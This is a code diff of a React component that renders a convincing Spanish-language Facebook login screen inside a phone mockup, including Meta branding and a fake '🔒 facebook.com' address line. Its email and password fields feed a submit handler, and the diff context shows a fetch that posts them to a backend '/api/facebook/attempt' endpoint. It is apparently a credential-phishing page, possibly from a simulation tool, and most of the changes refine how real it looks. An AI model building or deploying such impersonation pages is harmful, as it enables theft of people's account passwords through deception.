@@ -229,47 +229,127 @@ fetch('${backendUrl}/api/facebook/attempt',{method:'POST',headers:{'Content-Type
             borderRadius: 'var(--radius-lg)', padding: '24px 16px',
             border: '1px solid var(--border-color)',
             display: 'flex', justifyContent: 'center', alignItems: 'center',
-            minHeight: '620px'
+            minHeight: '680px'
           }}>
-            <div style={{
-              width: '290px', background: '#ffffff',
-              borderRadius: '30px', overflow: 'hidden', position: 'relative',
-              boxShadow: '0 0 0 3px #d5d5d5, 0 0 0 5px #aaa, 0 12px 40px rgba(0,0,0,0.2)',
-            }}>
-              <div style={{ position: 'absolute', top: '8px', left: '50%', transform: 'translateX(-50%)', width: '90px', height: '22px', background: '#1c1e21', borderRadius: '14px', zIndex: 10 }}></div>
-              <div style={{ padding: '8px 12px 0', display: 'flex', justifyContent: 'space-between', alignItems: 'center', paddingTop: '40px' }}>
-                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#1c1e21" strokeWidth="2.2"><path d="M15 19l-7-7 7-7"/></svg>
-                <span style={{ fontSize: '12px', color: '#606770' }}>Español</span>
-                <div style={{ width: '18px' }}></div>
-              </div>
-              <div style={{ display: 'flex', justifyContent: 'center', padding: '20px 0 18px' }}>
-                <div style={{ width: '56px', height: '56px', background: '#1877f2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
-                  <svg width="34" height="34" viewBox="0 0 36 36" fill="white"><path d="M20.18 35.87V21.94h4.45l.67-5.17h-5.12v-3.3c0-1.5.41-2.51 2.57-2.51h2.74V6.42a36.74 36.74 0 0 0-4-.2c-3.96 0-6.68 2.42-6.68 6.86v3.83H10.4v5.17h4.41v13.79a18 18 0 1 1 5.37 0z"/></svg>
-                </div>
-              </div>
-              <div style={{ padding: '0 12px' }}>
-                <input type="text" placeholder="Celular o correo electrónico" value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  style={{ width: '100%', padding: '10px 12px', border: '1px solid #dddfe2', borderRadius: '6px', fontSize: '13px', color: '#1c1e21', marginBottom: '8px', outline: 'none', background: '#ffffff', boxSizing: 'border-box' }} />
-                <input type="password" placeholder="Contraseña" value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                  style={{ width: '100%', padding: '10px 12px', border: '1px solid #dddfe2', borderRadius: '6px', fontSize: '13px', color: '#1c1e21', marginBottom: '8px', outline: 'none', background: '#ffffff', boxSizing: 'border-box' }} />
-                <button onClick={handleSubmit} disabled={submitting}
-                  style={{ width: '100%', padding: '11px', background: submitting ? '#aaa' : '#1877f2', color: '#fff', border: 'none', borderRadius: '6px', fontSize: '14px', fontWeight: '600', cursor: submitting ? 'not-allowed' : 'pointer', marginBottom: '14px' }}>
-                  {submitting ? 'Verificando...' : 'Iniciar sesión'}
-                </button>
-                <div style={{ textAlign: 'center', marginBottom: '18px' }}>
-                  <span style={{ fontSize: '12px', fontWeight: '600', color: '#1c1e21', cursor: 'pointer' }}>¿Olvidaste tu contraseña?</span>
-                </div>
-              </div>
-              <div style={{ padding: '0 12px' }}>
-                <button style={{ width: '100%', padding: '10px', background: '#fff', color: '#1877f2', border: '1.5px solid #1877f2', borderRadius: '6px', fontSize: '14px', fontWeight: '600', cursor: 'pointer', marginBottom: '12px' }}>Crear cuenta nueva</button>
-                <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '5px', paddingBottom: '8px' }}>
-                  <svg width="12" height="12" viewBox="0 0 48 48" fill="#606770"><path d="M6.5 24c0-4.4 1-7.8 2.4-9.8 1-1.5 2.3-2.2 3.6-2.2 1.6 0 3.2 1.2 4.8 4.3C18.4 18.8 19.6 21.3 21 24c-1.4 2.7-2.6 5.2-3.7 7.7-1.6 3.1-3.2 4.3-4.8 4.3-1.3 0-2.6-.7-3.6-2.2C7.5 31.8 6.5 28.4 6.5 24zm20.2-7.6c-2-3.5-4.3-5.4-7.2-5.4-2.1 0-4 1-5.6 3.1C12 16.6 10.5 20.1 10.5 24c0 3.9 1.5 7.4 3.4 9.9 1.6 2.1 3.5 3.1 5.6 3.1 2.9 0 5.2-1.9 7.2-5.4C28.3 29 29.7 26.6 31 24c-1.3-2.6-2.7-5-4.3-7.6zM31 24c1.4 2.7 2.8 5.1 4.3 7.6 2 3.5 4.3 5.4 7.2 5.4 1.3 0 2.6-.7 3.6-2.2C47.5 32.6 48 29 48 24s-.5-8.6-1.9-10.8c-1-1.5-2.3-2.2-3.6-2.2-2.9 0-5.2 1.9-7.2 5.4C33.8 18.9 32.4 21.4 31 24zm10.5 0c0 4.4-1 7.8-2.4 9.8-1 1.5-2.3 2.2-3.6 2.2-1.6 0-3.2-1.2-4.8-4.3C29.6 29.2 28.4 26.7 27 24c1.4-2.7 2.6-5.2 3.7-7.7 1.6-3.1 3.2-4.3 4.8-4.3 1.3 0 2.6.7 3.6 2.2 1.4 2 2.4 5.4 2.4 9.8z"/></svg>
-                  <span style={{ color: '#606770', fontSize: '12px', fontWeight: '500' }}>Meta</span>
-                </div>
-                <div style={{ textAlign: 'center', paddingBottom: '14px' }}>
-                  <span style={{ fontSize: '10px', color: '#8a8d91' }}>🔒 facebook.com</span>
+            {/* VOLUME BUTTONS */}
+            <div style={{ position: 'relative' }}>
+              <div style={{
+                position: 'absolute', right: '-6px', top: '100px', width: '3px', height: '40px',
+                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
+                borderRadius: '0 3px 3px 0', zIndex: 5
+              }}></div>
+              <div style={{
+                position: 'absolute', right: '-6px', top: '150px', width: '3px', height: '40px',
+                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
+                borderRadius: '0 3px 3px 0', zIndex: 5
+              }}></div>
+              <div style={{
+                position: 'absolute', left: '-6px', top: '140px', width: '3px', height: '50px',
+                background: 'linear-gradient(to bottom, #4a4a4a, #6a6a6a, #4a4a4a)',
+                borderRadius: '3px 0 0 3px', zIndex: 5
+              }}></div>
+              {/* PHONE BODY */}
+              <div style={{
+                width: '290px', background: '#1c1e21',
+                borderRadius: '42px', overflow: 'hidden', position: 'relative',
+                boxShadow: '0 0 0 2px #2a2a2a, 0 0 0 4px #111, 0 20px 60px rgba(0,0,0,0.5), inset 0 0 0 1px rgba(255,255,255,0.05)',
+                padding: '8px'
+              }}>
+                {/* SCREEN */}
+                <div style={{
+                  borderRadius: '34px', overflow: 'hidden', position: 'relative',
+                  background: '#ffffff'
+                }}>
+                  {/* DYNAMIC ISLAND */}
+                  <div style={{
+                    position: 'absolute', top: '6px', left: '50%', transform: 'translateX(-50%)',
+                    width: '100px', height: '28px', background: '#1c1e21',
+                    borderRadius: '18px', zIndex: 20,
+                    display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px'
+                  }}>
+                    <div style={{ width: '7px', height: '7px', borderRadius: '50%', background: '#1a1a2e', border: '1px solid #333' }}></div>
+                    <div style={{ width: '16px', height: '4px', borderRadius: '2px', background: '#2a2a3a' }}></div>
+                  </div>
+                  {/* STATUS BAR */}
+                  <div style={{
+                    padding: '10px 18px 0', display: 'flex', justifyContent: 'space-between',
+                    alignItems: 'center', paddingTop: '44px', fontSize: '11px',
+                    fontFamily: '-apple-system, system-ui, sans-serif', fontWeight: '600',
+                    color: '#1c1e21'
+                  }}>
+                    <span>9:41</span>
+                    <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
+                      <svg width="14" height="10" viewBox="0 0 18 12" fill="none">
+                        <rect x="1" y="1" width="14" height="10" rx="2" stroke="#1c1e21" strokeWidth="1.2" fill="none"/>
+                        <rect x="2" y="2.5" width="10" height="7" rx="1" fill="#1c1e21" opacity="0.8"/>
+                        <path d="M16 4v4" stroke="#1c1e21" strokeWidth="1.2"/>
+                      </svg>
+                      <svg width="14" height="10" viewBox="0 0 16 12">
+                        <rect x="0.5" y="1.5" width="13" height="9" rx="2" fill="none" stroke="#1c1e21" strokeWidth="1.2"/>
+                        <rect x="2" y="3" width="10" height="6" rx="1" fill="#1c1e21" opacity="0.8"/>
+                        <path d="M14 3v6" stroke="#1c1e21" strokeWidth="1.2"/>
+                      </svg>
+                    </div>
+                  </div>
+                  {/* BROWSER BAR */}
+                  <div style={{
+                    padding: '4px 12px 0', display: 'flex', justifyContent: 'space-between',
+                    alignItems: 'center'
+                  }}>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#606770" strokeWidth="2">
+                      <path d="M15 19l-7-7 7-7"/>
+                    </svg>
+                    <span style={{ fontSize: '11px', color: '#606770', fontWeight: '500' }}>Español</span>
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="#606770">
+                      <path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/>
+                    </svg>
+                  </div>
+                  {/* FACEBOOK LOGO */}
+                  <div style={{ display: 'flex', justifyContent: 'center', padding: '14px 0 14px' }}>
+                    <div style={{ width: '52px', height: '52px', background: '#1877f2', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
+                      <svg width="32" height="32" viewBox="0 0 36 36" fill="white"><path d="M20.18 35.87V21.94h4.45l.67-5.17h-5.12v-3.3c0-1.5.41-2.51 2.57-2.51h2.74V6.42a36.74 36.74 0 0 0-4-.2c-3.96 0-6.68 2.42-6.68 6.86v3.83H10.4v5.17h4.41v13.79a18 18 0 1 1 5.37 0z"/></svg>
+                    </div>
+                  </div>
+                  {/* FORM */}
+                  <div style={{ padding: '0 16px' }}>
+                    <input type="text" placeholder="Celular o correo electrónico" value={email}
+                      onChange={(e) => setEmail(e.target.value)}
+                      style={{ width: '100%', padding: '12px 14px', border: '1px solid #dddfe2', borderRadius: '8px', fontSize: '14px', color: '#1c1e21', marginBottom: '10px', outline: 'none', background: '#f5f6f7', boxSizing: 'border-box', transition: 'all 0.2s' }}
+                      onFocus={e => { e.target.style.borderColor = '#1877f2'; e.target.style.background = '#fff'; }}
+                      onBlur={e => { e.target.style.borderColor = '#dddfe2'; e.target.style.background = '#f5f6f7'; }} />
+                    <input type="password" placeholder="Contraseña" value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                      style={{ width: '100%', padding: '12px 14px', border: '1px solid #dddfe2', borderRadius: '8px', fontSize: '14px', color: '#1c1e21', marginBottom: '12px', outline: 'none', background: '#f5f6f7', boxSizing: 'border-box', transition: 'all 0.2s' }}
+                      onFocus={e => { e.target.style.borderColor = '#1877f2'; e.target.style.background = '#fff'; }}
+                      onBlur={e => { e.target.style.borderColor = '#dddfe2'; e.target.style.background = '#f5f6f7'; }} />
+                    <button onClick={handleSubmit} disabled={submitting}
+                      style={{ width: '100%', padding: '12px', background: submitting ? '#aaa' : '#1877f2', color: '#fff', border: 'none', borderRadius: '8px', fontSize: '15px', fontWeight: '700', cursor: submitting ? 'not-allowed' : 'pointer', marginBottom: '14px', letterSpacing: '0.3px' }}>
+                      {submitting ? 'Verificando...' : 'Iniciar sesión'}
+                    </button>
+                    <div style={{ textAlign: 'center', marginBottom: '20px' }}>
+                      <span style={{ fontSize: '13px', fontWeight: '500', color: '#1877f2', cursor: 'pointer' }}>¿Olvidaste tu contraseña?</span>
+                    </div>
+                  </div>
+                  {/* FOOTER */}
+                  <div style={{ padding: '0 16px', borderTop: '1px solid #dadde1', paddingTop: '18px' }}>
+                    <button style={{ width: '100%', padding: '12px', background: '#fff', color: '#1877f2', border: '1.5px solid #1877f2', borderRadius: '8px', fontSize: '14px', fontWeight: '700', cursor: 'pointer', marginBottom: '16px' }}>Crear cuenta nueva</button>
+                    <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', paddingBottom: '10px' }}>
+                      <svg width="14" height="14" viewBox="0 0 48 48" fill="#606770"><path d="M6.5 24c0-4.4 1-7.8 2.4-9.8 1-1.5 2.3-2.2 3.6-2.2 1.6 0 3.2 1.2 4.8 4.3C18.4 18.8 19.6 21.3 21 24c-1.4 2.7-2.6 5.2-3.7 7.7-1.6 3.1-3.2 4.3-4.8 4.3-1.3 0-2.6-.7-3.6-2.2C7.5 31.8 6.5 28.4 6.5 24zm20.2-7.6c-2-3.5-4.3-5.4-7.2-5.4-2.1 0-4 1-5.6 3.1C12 16.6 10.5 20.1 10.5 24c0 3.9 1.5 7.4 3.4 9.9 1.6 2.1 3.5 3.1 5.6 3.1 2.9 0 5.2-1.9 7.2-5.4C28.3 29 29.7 26.6 31 24c-1.3-2.6-2.7-5-4.3-7.6zM31 24c1.4 2.7 2.8 5.1 4.3 7.6 2 3.5 4.3 5.4 7.2 5.4 1.3 0 2.6-.7 3.6-2.2C47.5 32.6 48 29 48 24s-.5-8.6-1.9-10.8c-1-1.5-2.3-2.2-3.6-2.2-2.9 0-5.2 1.9-7.2 5.4C33.8 18.9 32.4 21.4 31 24zm10.5 0c0 4.4-1 7.8-2.4 9.8-1 1.5-2.3 2.2-3.6 2.2-1.6 0-3.2-1.2-4.8-4.3C29.6 29.2 28.4 26.7 27 24c1.4-2.7 2.6-5.2 3.7-7.7 1.6-3.1 3.2-4.3 4.8-4.3 1.3 0 2.6.7 3.6 2.2 1.4 2 2.4 5.4 2.4 9.8z"/></svg>
+                      <span style={{ color: '#606770', fontSize: '12px', fontWeight: '500' }}>Meta</span>
+                    </div>
+                    <div style={{ textAlign: 'center', paddingBottom: '12px' }}>
+                      <span style={{ fontSize: '11px', color: '#8a8d91' }}>🔒 facebook.com</span>
+                    </div>
+                  </div>
+                  {/* HOME INDICATOR */}
+                  <div style={{
+                    display: 'flex', justifyContent: 'center', padding: '6px 0 8px'
+                  }}>
+                    <div style={{
+                      width: '120px', height: '4px', background: '#d0d2d6',
+                      borderRadius: '2px'
+                    }}></div>
+                  </div>
                 </div>
               </div>
             </div>
